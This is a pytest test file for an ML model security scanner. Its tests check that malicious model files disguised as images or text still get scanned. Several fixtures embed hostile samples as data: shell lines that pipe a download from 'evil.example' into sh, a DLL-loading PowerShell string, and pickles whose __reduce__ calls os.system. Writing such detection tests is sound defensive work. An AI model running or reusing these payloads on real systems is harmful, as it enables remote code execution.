"""Tests for directory scanning with file filtering."""

import bz2
import gzip
import importlib
import json
import lzma
import pickle
import struct
import sys
import tarfile
import tempfile
import zipfile
from collections.abc import Callable
from pathlib import Path
from typing import cast

import pytest

from modelaudit import core as core_module
from modelaudit.core import _is_huggingface_cache_file, determine_exit_code, scan_file, scan_model_directory_or_file
from modelaudit.utils.file import detection as file_detection
from modelaudit.utils.file.detection import (
    FLAX_MSGPACK_STRUCTURE_READ_BYTES,
    JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES,
    LLAMAFILE_ROUTE_SCAN_BYTES,
    LLAMAFILE_ROUTE_TAIL_SCAN_BYTES,
    MXNET_SYMBOL_SIGNATURE_READ_BYTES,
    SAFETENSORS_ROUTING_HEADER_PARSE_BYTES,
)
from modelaudit.utils.file.filtering import _ZIP_MEMBER_SNIFF_LIMIT
from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs as _has_tf_protos
from tests.helpers import (
    create_mock_mxnet_symbol,
    create_mock_onnx,
    prefix_mock_onnx_with_unknown_field,
    prefix_mock_onnx_with_unknown_group,
)


def _require_tf_protos() -> None:
    if not _has_tf_protos():
        pytest.skip("TensorFlow protobuf stubs unavailable")


def _build_malicious_tf_metagraph() -> bytes:
    _require_tf_protos()
    import modelaudit.protos  # noqa: F401

    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
    metagraph = meta_graph_pb2.MetaGraphDef()
    metagraph.meta_info_def.meta_graph_version = "modelaudit_directory_route_test"
    node = metagraph.graph_def.node.add()
    node.name = "pyfunc_node"
    node.op = "PyFunc"
    node.attr["func"].s = b"python -c 'import os; os.system(\"curl https://evil.example/x | sh\")'"
    return cast(bytes, metagraph.SerializeToString())


def _build_malicious_tf_savedmodel() -> bytes:
    _require_tf_protos()
    import modelaudit.protos  # noqa: F401

    saved_model_pb2 = importlib.import_module("tensorflow.core.protobuf.saved_model_pb2")
    saved_model = saved_model_pb2.SavedModel()
    saved_model.saved_model_schema_version = 1
    metagraph = saved_model.meta_graphs.add()
    node = metagraph.graph_def.node.add()
    node.name = "pyfunc_node"
    node.op = "PyFunc"
    return cast(bytes, saved_model.SerializeToString())


def _write_sparse_oversized_safetensors_candidate(path: Path) -> None:
    header_len = SAFETENSORS_ROUTING_HEADER_PARSE_BYTES + 1
    with path.open("wb") as handle:
        handle.write(struct.pack("<Q", header_len))
        handle.write(b"{")
        handle.truncate(8 + header_len + 1)


def _printable_unknown_proto_prefix(min_bytes: int) -> bytes:
    field = b"z " + (b"x" * 32)
    return field * ((min_bytes // len(field)) + 1)


def _corrupt_zip_member_crc(path: Path, member_name: str) -> None:
    """Patch a ZIP member CRC so full scanning sees a malformed entry."""
    with zipfile.ZipFile(path) as archive:
        info = archive.getinfo(member_name)
        bad_crc = ((info.CRC + 1) & 0xFFFFFFFF).to_bytes(4, "little")
        local_offset = info.header_offset

    data = bytearray(path.read_bytes())
    assert data[local_offset : local_offset + 4] == b"PK\x03\x04"
    data[local_offset + 14 : local_offset + 18] = bad_crc

    member_name_bytes = member_name.encode("utf-8")
    central_offset = 0
    while True:
        central_offset = data.find(b"PK\x01\x02", central_offset)
        assert central_offset >= 0
        name_length = int.from_bytes(data[central_offset + 28 : central_offset + 30], "little")
        extra_length = int.from_bytes(data[central_offset + 30 : central_offset + 32], "little")
        comment_length = int.from_bytes(data[central_offset + 32 : central_offset + 34], "little")
        name_start = central_offset + 46
        name_end = name_start + name_length
        if data[name_start:name_end] == member_name_bytes:
            data[central_offset + 16 : central_offset + 20] = bad_crc
            break
        central_offset = name_end + extra_length + comment_length

    path.write_bytes(data)


def _write_malicious_cntk(path: Path, include_structure: bool = True) -> None:
    prefix = b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
    structure = b" CompositeFunction primitive_functions " if include_structure else b""
    payload = b" native_user_function loadlibrary C:\\temp\\evil.dll powershell -c curl http://evil.example/p.sh "
    path.write_bytes(prefix + structure + payload)


def _write_malicious_lightgbm(path: Path, valid: bool = True) -> None:
    body = "tree=0\nversion=v4\nnum_class=1\n"
    if valid:
        body += (
            "num_tree_per_iteration=1\nmax_feature_idx=2\ntree_sizes=12\nnum_leaves=2\n"
            "split_feature=0\nleaf_value=0.1 0.2\n"
            "metadata=os.system('curl https://collector.evil.example/payload.sh | sh')\n"
            "callback_url=https://collector.evil.example/payload.sh\n"
        )
    path.write_text(body, encoding="utf-8")


class TestDirectoryFileFiltering:
    """Test directory scanning with file filtering."""

    def test_skip_file_types_enabled(self):
        """Test that non-model files are skipped when skip_file_types=True."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            # Create various file types
            (Path(tmp_dir) / "README.md").write_text("Documentation")
            (Path(tmp_dir) / "script.py").write_text("print('hello')")
            (Path(tmp_dir) / "style.css").write_text("body { color: red; }")
            (Path(tmp_dir) / "model.pkl").write_bytes(pickle.dumps({"weights": [1.0]}))
            (Path(tmp_dir) / "config.json").write_text('{"key": "value"}')

            # Scan with file filtering enabled (default)
            results = scan_model_directory_or_file(tmp_dir, skip_file_types=True)

            # Should scan model files and README for security
            assert results["files_scanned"] == 3  # model.pkl, config.json, and README.md
            assert results["success"] is True

    def test_skip_file_types_disabled(self):
        """Test that all files are scanned when skip_file_types=False."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            # Create various file types
            (Path(tmp_dir) / "README.md").write_text("Documentation")
            (Path(tmp_dir) / "script.py").write_text("print('hello')")
            (Path(tmp_dir) / "style.css").write_text("body { color: red; }")
            (Path(tmp_dir) / "model.pkl").write_bytes(pickle.dumps({"weights": [1.0]}))
            (Path(tmp_dir) / "config.json").write_text('{"key": "value"}')

            # Scan with file filtering disabled
            results = scan_model_directory_or_file(tmp_dir, skip_file_types=False)

            # Should scan all files
            assert results["files_scanned"] == 5
            assert results["success"] is True

    def test_hidden_files_skipped(self):
        """Test that hidden files are skipped appropriately."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            # Create hidden and non-hidden files
            (Path(tmp_dir) / ".DS_Store").write_text("metadata")
            (Path(tmp_dir) / ".gitignore").write_text("*.pyc")
            (Path(tmp_dir) / ".model.pkl").write_bytes(pickle.dumps({"hidden": True}))
            (Path(tmp_dir) / "visible.pkl").write_bytes(pickle.dumps({"visible": True}))

            # Scan with default settings
            results = scan_model_directory_or_file(tmp_dir)

            # Should skip .DS_Store and .gitignore but scan model files
            assert results["files_scanned"] == 2  # .model.pkl and visible.pkl
            assert results["success"] is True

    def test_nested_directories(self):
        """Test file filtering in nested directories."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            # Create nested structure
            sub_dir = Path(tmp_dir) / "models"
            sub_dir.mkdir()

            # Root files
            (Path(tmp_dir) / "README.md").write_text("Root readme")
            (Path(tmp_dir) / "model1.pkl").write_bytes(pickle.dumps({"model": 1}))

            # Subdirectory files
            (sub_dir / "README.md").write_text("Sub readme")
            (sub_dir / "model2.pkl").write_bytes(pickle.dumps({"model": 2}))
            (sub_dir / "train.py").write_text("training script")

            # Scan with filtering enabled
            results = scan_model_directory_or_file(tmp_dir)

            # Should scan .pkl files and README files for security
            assert results["files_scanned"] == 4  # model1.pkl, model2.pkl, and 2 README.md files
            assert results["success"] is True

    def test_cli_compatibility(self):
        """Test that the parameter works as expected from CLI context."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            # Create test files
            (Path(tmp_dir) / "doc.txt").write_text("text file")
            (Path(tmp_dir) / "model.bin").write_bytes(b"binary model")

            # Test with different parameter values matching CLI behavior
            # CLI --no-skip-files means skip_file_types=False
            results_no_skip = scan_model_directory_or_file(tmp_dir, skip_file_types=False)
            assert results_no_skip["files_scanned"] == 2

            # CLI default (--skip-files) means skip_file_types=True
            results_skip = scan_model_directory_or_file(tmp_dir, skip_file_types=True)
            assert results_skip["files_scanned"] == 1  # only model.bin

    def test_license_files_metadata_collected(self):
        """Ensure license files are processed for metadata even when skipped."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            license_plain = Path(tmp_dir) / "LICENSE"
            license_txt = Path(tmp_dir) / "LICENSE.txt"
            license_plain.write_text("MIT License")
            license_txt.write_text("MIT License")

            results = scan_model_directory_or_file(tmp_dir)

            file_meta = results.get("file_metadata", {})
            # Resolve paths to handle system-specific path resolution differences
            license_plain_resolved = str(license_plain.resolve())
            license_txt_resolved = str(license_txt.resolve())

            assert license_plain_resolved in file_meta
            assert file_meta[license_plain_resolved]["license_info"]
            assert license_txt_resolved in file_meta
            assert file_meta[license_txt_resolved]["license_info"]

    def test_registered_archives_hidden_models_and_metadata_are_scanned(self, tmp_path: Path) -> None:
        """Directory prefilter should not skip scannable archives, hidden models, or .metadata files."""
        (tmp_path / ".weights.onnx").write_bytes(b"\x08\x01\x12\x00onnx")
        (tmp_path / "model.metadata").write_text('{"name": "test/model"}')

        tar_path = tmp_path / "archive.tar"
        tar_member = tmp_path / "member.txt"
        tar_member.write_text("tar payload")
        with tarfile.open(tar_path, "w") as tar:
            tar.add(tar_member, arcname="member.txt")
        tar_member.unlink()

        (tmp_path / "archive.gz").write_bytes(gzip.compress(b"gz payload"))
        (tmp_path / "archive.bz2").write_bytes(bz2.compress(b"bz2 payload"))
        (tmp_path / "archive.xz").write_bytes(lzma.compress(b"xz payload"))
        (tmp_path / "archive.7z").write_bytes(b"7z\xbc\xaf\x27\x1c" + b"payload")

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 7
        asset_names = {Path(asset.path).name for asset in results.assets}
        assert ".weights.onnx" in asset_names
        assert "model.metadata" in asset_names
        assert "archive.tar" in asset_names
        assert "archive.gz" in asset_names
        assert "archive.bz2" in asset_names
        assert "archive.xz" in asset_names
        assert "archive.7z" in asset_names

    def test_hidden_dvc_pointer_expands_hidden_artifact(self, tmp_path: Path) -> None:
        """Hidden DVC pointers should survive prefiltering so their targets are scanned."""
        hidden_archive = tmp_path / ".artifact"
        with zipfile.ZipFile(hidden_archive, "w") as archive:
            archive.writestr("weights.bin", b"payload")

        hidden_pointer = tmp_path / ".artifact.dvc"
        hidden_pointer.write_text("outs:\n- path: .artifact\n")

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 1
        asset_names = {Path(asset.path).name for asset in results.assets}
        assert asset_names == {".artifact"}

    def test_disguised_pickle_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
        """Directory scans should not skip payloads whose content is a supported format."""
        disguised_payload = tmp_path / "payload.jpg"

        class DangerousPayload:
            def __reduce__(self) -> tuple[object, tuple[str]]:
                import os as os_module

                return (os_module.system, ("echo directory-prefilter-test",))

        disguised_payload.write_bytes(pickle.dumps(DangerousPayload()))

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 1
        assert any("payload.jpg" in (issue.location or "") for issue in results.issues)

    def test_disguised_oversized_safetensors_with_skipped_extension_fails_closed(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        disguised_payload = tmp_path / "weights.jpg"
        _write_sparse_oversized_safetensors_candidate(disguised_payload)
        from modelaudit.scanners.safetensors_scanner import SafeTensorsScanner

        monkeypatch.setattr(
            SafeTensorsScanner,
            "calculate_file_hashes",
            lambda _self, _path: pytest.fail("oversized SafeTensors headers must fail before hashing"),
        )
        monkeypatch.setattr(
            core_module,
            "_calculate_file_hash",
            lambda _path: pytest.fail("oversized SafeTensors directory entries must fail before dedup hashing"),
        )

        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

        assert results["files_scanned"] == 1
        assert "safetensors" in results.scanner_names
        assert results["success"] is False
        assert determine_exit_code(results) == 2
        assert any(check.name == "Header Size Limit" for check in results.checks)

    def test_disguised_malicious_jax_json_checkpoint_is_scanned_without_ajax_near_match(self, tmp_path: Path) -> None:
        """Directory scans should preserve JAX metadata content but not `ajax` lookalikes."""
        payload = "jax.experimental.host_callback.call(os.system, 'id')"
        (tmp_path / "payload.jpg").write_text(
            (" " * 1024) + json.dumps({"framework": "jax", "payload": payload}),
            encoding="utf-8",
        )
        (tmp_path / "ajax.jpg").write_text(
            json.dumps({"framework": "ajax", "payload": payload}),
            encoding="utf-8",
        )

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 1
        assert "jax_checkpoint" in results.scanner_names
        assert determine_exit_code(results) == 1
        assert any(issue.message.startswith("Suspicious pattern in JSON checkpoint") for issue in results.issues)

    def test_oversized_disguised_jax_json_checkpoint_fails_closed_after_late_identity(self, tmp_path: Path) -> None:
        """Directory filtering should preserve bounded JAX identity routing for large JSON."""
        padding = "x" * (JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES + 16)
        (tmp_path / "payload.jpg").write_text(json.dumps({"padding": padding, "framework": "jax"}), encoding="utf-8")
        (tmp_path / "ajax.jpg").write_text(json.dumps({"padding": padding, "framework": "ajax"}), encoding="utf-8")

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 1
        assert "jax_checkpoint" in results.scanner_names
        assert results.success is False
        assert determine_exit_code(results) == 2

    def test_large_disguised_malicious_flax_msgpack_with_later_root_is_scanned(self, tmp_path: Path) -> None:
        """Directory scans should preserve renamed MessagePack checkpoints for Flax analysis."""
        msgpack = pytest.importorskip("msgpack")
        disguised_payload = tmp_path / "payload.jpg"
        disguised_payload.write_bytes(
            msgpack.packb(
                {
                    "metadata": "x" * (FLAX_MSGPACK_STRUCTURE_READ_BYTES + 100),
                    "params": {"w": [1, 2, 3]},
                    "__reduce__": "os.system",
                },
                use_bin_type=True,
            )
        )

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 1
        assert "flax_msgpack" in results.scanner_names
        assert determine_exit_code(results) == 1
        assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in results.issues)

    def test_disguised_flax_msgpack_stream_with_malicious_trailing_object_is_scanned(self, tmp_path: Path) -> None:
        msgpack = pytest.importorskip("msgpack")
        disguised_payload = tmp_path / "stream.jpg"
        disguised_payload.write_bytes(
            msgpack.packb({"params": {"w": [1, 2, 3]}}, use_bin_type=True)
            + msgpack.packb({"__reduce__": "os.system"}, use_bin_type=True)
        )

        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

        assert results["files_scanned"] == 1
        assert "flax_msgpack" in results.scanner_names
        assert determine_exit_code(results) == 1
        assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in results.issues)

    def test_disguised_flax_msgpack_stream_with_later_checkpoint_object_is_scanned(self, tmp_path: Path) -> None:
        msgpack = pytest.importorskip("msgpack")
        disguised_payload = tmp_path / "stream-later-root.jpg"
        disguised_payload.write_bytes(
            msgpack.packb({"metadata": {"producer": "flax"}}, use_bin_type=True)
            + msgpack.packb({"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}, use_bin_type=True)
        )

        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

        assert results["files_scanned"] == 1
        assert "flax_msgpack" in results.scanner_names
        assert determine_exit_code(results) == 1
        assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in results.issues)

    def test_disguised_flax_msgpack_stream_with_leading_scalar_object_is_scanned(self, tmp_path: Path) -> None:
        msgpack = pytest.importorskip("msgpack")
        disguised_payload = tmp_path / "stream-leading-scalar.jpg"
        disguised_payload.write_bytes(
            msgpack.packb(None, use_bin_type=True)
            + msgpack.packb({"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}, use_bin_type=True)
        )

        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

        assert results["files_scanned"] == 1
        assert "flax_msgpack" in results.scanner_names
        assert determine_exit_code(results) == 1
        assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in results.issues)

    def test_disguised_flax_msgpack_stream_with_xml_looking_scalar_is_scanned(self, tmp_path: Path) -> None:
        msgpack = pytest.importorskip("msgpack")
        disguised_payload = tmp_path / "xml-looking-scalar.txt"
        disguised_payload.write_bytes(
            msgpack.packb(60, use_bin_type=True)
            + msgpack.packb({"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}, use_bin_type=True)
        )

        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

        assert results["files_scanned"] == 1
        assert "flax_msgpack" in results.scanner_names
        assert determine_exit_code(results) == 1
        assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in results.issues)

    @pytest.mark.parametrize("suffix", [".txt", ".md", ".markdown", ".rst", ".ini", ".cfg", ".toml", ".conf"])
    def test_disguised_flax_msgpack_under_default_skipped_suffix_is_scanned(
        self,
        tmp_path: Path,
        suffix: str,
    ) -> None:
        msgpack = pytest.importorskip("msgpack")
        disguised_payload = tmp_path / f"stream{suffix}"
        disguised_payload.write_bytes(
            msgpack.packb({"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}, use_bin_type=True)
        )

        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

        assert results["files_scanned"] == 1
        assert "flax_msgpack" in results.scanner_names
        assert determine_exit_code(results) == 1
        assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in results.issues)

    def test_oversized_plain_text_document_suffix_fails_closed_in_directory_scan(self, tmp_path: Path) -> None:
        document = tmp_path / "notes.txt"
        document.write_bytes(b" " * (2 * (FLAX_MSGPACK_STRUCTURE_READ_BYTES + 1) + 2))

        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

        assert results["files_scanned"] == 1
        assert "flax_msgpack" in results.scanner_names
        assert determine_exit_code(results) == 2

    def test_small_plain_text_document_remains_skipped_in_directory_scan(self, tmp_path: Path) -> None:
        document = tmp_path / "notes.txt"
        document.write_text("ordinary project documentation\n", encoding="utf-8")

        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

        assert results["files_scanned"] == 0
        assert "flax_msgpack" not in results.scanner_names

    def test_large_json_array_under_skipped_suffix_is_scanned_fail_closed(self, tmp_path: Path) -> None:
        json_array = tmp_path / "metadata.jpg"
        json_array.write_bytes(b"[" + b"0," * ((MXNET_SYMBOL_SIGNATURE_READ_BYTES // 2) + 100) + b"0]")

        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

        assert results["files_scanned"] == 1
        assert "flax_msgpack" in results.scanner_names
        assert determine_exit_code(results) == 2

    @pytest.mark.parametrize("suffix", [".jpg", ".txt"])
    def test_scalar_padded_disguised_flax_stream_fails_closed_at_analysis_limit(
        self, tmp_path: Path, suffix: str
    ) -> None:
        msgpack = pytest.importorskip("msgpack")
        disguised_payload = tmp_path / f"stream-scalar-padding{suffix}"
        disguised_payload.write_bytes(
            msgpack.packb(None, use_bin_type=True) * 4097
            + msgpack.packb({"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}, use_bin_type=True)
        )

        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

        assert results["files_scanned"] == 1
        assert "flax_msgpack" in results.scanner_names
        assert determine_exit_code(results) == 2
        limit_issues = [issue for issue in results.issues if "unvalidated trailing data" in issue.message]
        assert len(limit_issues) == 1
        assert limit_issues[0].details["max_msgpack_stream_objects"] == 4096
        assert limit_issues[0].details["parsed_object_count"] == 4096

    def test_disguised_flax_state_wrapper_with_malicious_attribute_is_scanned(self, tmp_path: Path) -> None:
        msgpack = pytest.importorskip("msgpack")
        disguised_payload = tmp_path / "state-wrapper.jpg"
        disguised_payload.write_bytes(
            msgpack.packb(
                {"state": {"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}},
                use_bin_type=True,
            )
        )

        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

        assert results["files_scanned"] == 1
        assert "flax_msgpack" in results.scanner_names
        assert determine_exit_code(results) == 1
        assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in results.issues)

    def test_disguised_flax_msgpack_without_optional_dependency_is_not_skipped(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        disguised_payload = tmp_path / "model.jpg"
        disguised_payload.write_bytes(b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03")
        monkeypatch.setattr("modelaudit.scanners.flax_msgpack_scanner.HAS_MSGPACK", False)
        monkeypatch.setitem(sys.modules, "msgpack", None)

        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

        assert results["files_scanned"] == 1
        assert "flax_msgpack" in results.scanner_names
        assert determine_exit_code(results) == 1

    def test_ambiguous_disguised_flax_msgpack_probe_limit_fails_closed_in_directory_scan(self, tmp_path: Path) -> None:
        msgpack = pytest.importorskip("msgpack")
        ambiguous_payload = tmp_path / "ambiguous.jpg"
        large_metadata: dict[str, object] = {f"field{i}": i for i in range(2100)}
        large_metadata["blob"] = "x" * (FLAX_MSGPACK_STRUCTURE_READ_BYTES + 100)
        ambiguous_payload.write_bytes(
            msgpack.packb({"metadata": large_metadata, "state": {"selected": True}}, use_bin_type=True)
        )

        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

        assert results["files_scanned"] == 1
        assert "flax_msgpack" in results.scanner_names
        assert results.file_metadata[str(ambiguous_payload)]["scan_outcome"] == "inconclusive"
        assert determine_exit_code(results) == 2

    @pytest.mark.parametrize("filename", ["payload.jpg", "payload.py", "payload.pyw"])
    def test_disguised_malicious_tf_metagraph_with_skipped_extension_is_scanned(
        self,
        tmp_path: Path,
        filename: str,
    ) -> None:
        disguised_payload = tmp_path / filename
        disguised_payload.write_bytes(b"\xa2\x06\x80\x08" + (b"x" * 1024) + _build_malicious_tf_metagraph())

        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

        assert results["files_scanned"] == 1
        assert "tf_metagraph" in results.scanner_names
        assert determine_exit_code(results) == 1
        assert any(issue.message == "Dangerous TensorFlow operation: PyFunc" for issue in results.issues)

    @pytest.mark.parametrize("filename", ["saved.jpg", "saved.py", "saved.pyw"])
    def test_disguised_malicious_tf_savedmodel_with_skipped_extension_is_scanned(
        self,
        tmp_path: Path,
        filename: str,
    ) -> None:
        disguised_payload = tmp_path / filename
        disguised_payload.write_bytes(_build_malicious_tf_savedmodel())

        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

        assert results["files_scanned"] == 1
        assert "tf_savedmodel" in results.scanner_names
        assert determine_exit_code(results) == 1
        assert any("PyFunc operation detected" in issue.message for issue in results.issues)

    @pytest.mark.parametrize(
        ("filename", "payload", "expected_scanner"),
        [
            ("prefixed-graph.jpg", _build_malicious_tf_metagraph, "tf_metagraph"),
            ("prefixed-saved.jpg", _build_malicious_tf_savedmodel, "tf_savedmodel"),
        ],
    )
    def test_printable_prefixed_malicious_tf_payload_with_skipped_extension_is_scanned(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        filename: str,
        payload: Callable[[], bytes],
        expected_scanner: str,
    ) -> None:
        monkeypatch.setattr(file_detection, "JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES", 64)
        disguised_payload = tmp_path / filename
        disguised_payload.write_bytes(_printable_unknown_proto_prefix(65) + payload())

        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

        assert results["files_scanned"] == 1
        assert expected_scanner in results.scanner_names
        assert determine_exit_code(results) == 1

    def test_budget_prefixed_malicious_tf_payload_with_skipped_extension_fails_closed(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        monkeypatch.setattr(file_detection, "_TF_METAGRAPH_MAX_ROUTING_FIELDS", 2)
        disguised_payload = tmp_path / "budget-prefixed.jpg"
        disguised_payload.write_bytes(
            b"{" + (b"\x18\x00" * 3) + b"|" + b"z\x09\x81\xa6params\x80" + _build_malicious_tf_metagraph()
        )

        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

        assert results["files_scanned"] == 1
        assert "tf_metagraph" in results.scanner_names
        assert determine_exit_code(results) == 1
        assert any(issue.message == "Dangerous TensorFlow operation: PyFunc" for issue in results.issues)

    def test_prefixed_disguised_malicious_onnx_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
        pytest.importorskip("onnx")
        disguised_payload = create_mock_onnx(tmp_path / "payload.jpg", op_type="PythonOp")
        prefix_mock_onnx_with_unknown_field(disguised_payload, value_size=0, count=4097, field_number=8)

        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

        assert results["files_scanned"] == 1
        assert "onnx" in results.scanner_names
        assert determine_exit_code(results) == 1
        assert any(issue.details.get("op_type") == "PythonOp" for issue in results.issues)

    def test_group_budget_prefixed_malicious_onnx_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
        pytest.importorskip("onnx")
        disguised_payload = create_mock_onnx(tmp_path / "group-payload.jpg", op_type="PythonOp")
        prefix_mock_onnx_with_unknown_group(disguised_payload)

        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

        assert results["files_scanned"] == 1
        assert "onnx" in results.scanner_names
        assert determine_exit_code(results) == 1
        assert any(issue.details.get("op_type") == "PythonOp" for issue in results.issues)

    def test_disguised_cntk_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
        disguised_payload = tmp_path / "cntk.jpg"
        _write_malicious_cntk(disguised_payload)

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 1
        assert "cntk" in results.scanner_names
        assert any(issue.severity.value == "critical" for issue in results.issues)

    def test_disguised_cntk_near_match_remains_skipped(self, tmp_path: Path) -> None:
        near_match = tmp_path / "cntk-near-match.jpg"
        _write_malicious_cntk(near_match, include_structure=False)

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 0

    def test_disguised_lightgbm_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
        disguised_payload = tmp_path / "lightgbm.jpg"
        _write_malicious_lightgbm(disguised_payload)

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 1
        assert "lightgbm" in results.scanner_names
        assert any(issue.severity.value == "critical" for issue in results.issues)

    def test_disguised_lightgbm_near_match_remains_skipped(self, tmp_path: Path) -> None:
        near_match = tmp_path / "lightgbm-near-match.jpg"
        _write_malicious_lightgbm(near_match, valid=False)

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 0

    @pytest.mark.parametrize("filename", [".payload", "Makefile", "package.json", "CHANGELOG"])
    def test_disguised_pickle_with_default_hidden_or_basename_skip_is_scanned(
        self,
        tmp_path: Path,
        filename: str,
    ) -> None:
        """Default hidden/basename filters must not suppress supported payload content."""

        class DangerousPayload:
            def __reduce__(self) -> tuple[object, tuple[str]]:
                import os as os_module

                return (os_module.system, ("echo directory-hidden-filter-test",))

        safe_payload = tmp_path / "safe.pkl"
        disguised_payload = tmp_path / filename
        safe_payload.write_bytes(pickle.dumps({"safe": True}))
        disguised_payload.write_bytes(pickle.dumps(DangerousPayload()))

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 2
        assert any(filename in (issue.location or "") for issue in results.issues)

    def test_real_images_remain_skipped(self, tmp_path: Path) -> None:
        """Content sniffing should not promote ordinary media files into the scan set."""
        image_path = tmp_path / "cover.jpg"
        image_path.write_bytes(b"\xff\xd8\xff\xe0" + b"jpeg")

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 0

    def test_disguised_malicious_mxnet_symbol_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
        """Directory scans should preserve renamed MXNet symbol graphs for analysis."""
        disguised_symbol = create_mock_mxnet_symbol(
            tmp_path / "model.jpg",
            custom_library="../../tmp/libevil.so",
        )

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 1
        assert "mxnet" in results.scanner_names
        assert any(str(disguised_symbol) in (issue.location or "") for issue in results.issues)

    def test_disguised_torch7_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
        """Directory scans should preserve signature-valid Torch7 payloads despite misleading suffixes."""
        disguised_torch7 = tmp_path / "payload.jpg"
        disguised_torch7.write_bytes(
            b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
            b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
            b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
        )

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 1
        assert "torch7" in results.scanner_names
        assert any("payload.jpg" in (issue.location or "") for issue in results.issues)

    def test_disguised_torch_source_near_match_remains_skipped(self, tmp_path: Path) -> None:
        """Source files naming torch modules must not route as serialized Torch7."""
        source_near_match = tmp_path / "source.jpg"
        source_near_match.write_text("import torch\nimport torch.nn as nn\n\nclass Model(nn.Module):\n    pass\n")

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 0

    def test_disguised_llamafile_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
        """Directory scans should preserve executable Llamafiles despite misleading suffixes."""
        disguised_llamafile = tmp_path / "payload.jpg"
        disguised_llamafile.write_bytes(
            b"\x7fELF"
            + b"\x02\x01\x01\x00"
            + b"\x00" * 56
            + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
        )

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 1
        assert "llamafile" in results.scanner_names
        assert any("payload.jpg" in (issue.location or "") for issue in results.issues)

    def test_disguised_generic_executable_near_match_remains_skipped(self, tmp_path: Path) -> None:
        """Content routing must require the Llamafile marker, not only an executable header."""
        generic_executable = tmp_path / "tool.jpg"
        generic_executable.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime")

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 0

    def test_disguised_llamafile_probe_failure_is_not_skipped(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
